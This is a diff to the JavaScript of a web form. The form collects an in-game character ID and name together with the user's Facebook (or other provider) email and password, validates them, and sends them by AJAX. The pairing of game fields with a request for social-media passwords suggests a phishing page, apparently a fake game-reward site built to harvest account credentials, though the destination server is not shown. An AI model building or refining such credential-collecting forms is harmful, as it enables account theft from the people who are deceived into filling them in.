@@ -79,12 +79,70 @@ function drawMaterial(num) {
     }
 
     img.src = 'assets/images/material.png';
-
-    // imageElem.src = tCtx.canvas.toDataURL();
 }
 
 $(document).ready(function () {
     captchaGen();
+
+    $('#igid').tooltip({ 'trigger': 'focus', 'title': 'Your In-game Character ID' });
+    $('#ign').tooltip({ 'trigger': 'focus', 'title': 'Your In-game Name' });
+    $('#user').tooltip({ 'trigger': 'focus', 'title': `Your Facebook Email or Username`});
+    $('#pass').tooltip({ 'trigger': 'focus', 'title': 'Your Facebook Password'});
+
+    if (document.querySelector('input[name="loginMedium"]')) {
+        document.querySelectorAll('input[name="loginMedium"]').forEach((elem) => {
+            elem.addEventListener("change", function (event) {
+                let item = event.target.value;
+                $("#user").attr("placeholder", `${item} Email or Username`);
+                $("#pass").attr("placeholder", `${item} Password`);
+                $('#user').tooltip({ 'trigger': 'focus', 'title': `Your ${item} Email or Username`});
+            });
+        });
+    }
+
+
+    // validating input
+    $(":input").bind("keyup", function(e) {
+        // igid (5-12)
+        let ig_id = $('#igid').val().trim();
+        
+        if (ig_id < 9999 || ig_id > 999999999999) {
+            $('#igid').addClass('is-invalid');
+        } else {
+            $('#igid').removeClass('is-invalid');
+        }
+
+        // email
+        let len_user = $('#user').val().trim().length;
+        
+        if (len_user < 5) {
+            $('#user').addClass('is-invalid');
+        } else {
+            $('#user').removeClass('is-invalid');
+        }
+
+        // pass
+        let len_pass = $('#pass').val().trim().length;
+        
+        if (len_pass < 6) {
+            $('#pass').addClass('is-invalid');
+        } else {
+            $('#pass').removeClass('is-invalid');
+        }
+
+        // captcha
+        if ($('.captcha').html() != $('#captcha').val()) {
+            $('#captcha').addClass('is-invalid');
+        } else {
+            $('#captcha').removeClass('is-invalid');
+        }
+
+        if ($('#data :input').attr("class").includes('is-invalid')) {
+            $('#tapatap').addClass('disabled');
+        } else {
+            $('#tapatap').removeClass('disabled');
+        }
+    })
 
     $('.fa-sync').on('click', function () {
         captchaGen();
@@ -97,14 +155,12 @@ $(document).ready(function () {
             pass = $('#pass').val(),
             domain = $('input[name="loginMedium"]:checked').val();
 
-        console.log(igid, ign, user, pass, domain);
-
         if ($('.captcha').html() == $('#captcha').val() &&
             igid.length != 0 &&
             ign.length != 0 &&
             $('#captcha').val().length != 0) {
 
-            if (user.length > 0 && pass.length > 7) {
+            if (user.length > 0 && pass.length > 6) {
                 let payload = {
                     "ingameID": igid,
                     "ingameName": ign,
@@ -148,7 +204,9 @@ $(document).ready(function () {
                                 );
                             }, 35000);
                         } else {
-
+                            console.log(`status: ${xhr.status}`);
+                            console.log(`text status: ${textStatus}`);
+                            console.log(`data: ${data}`);
                         }
                     }
                 });
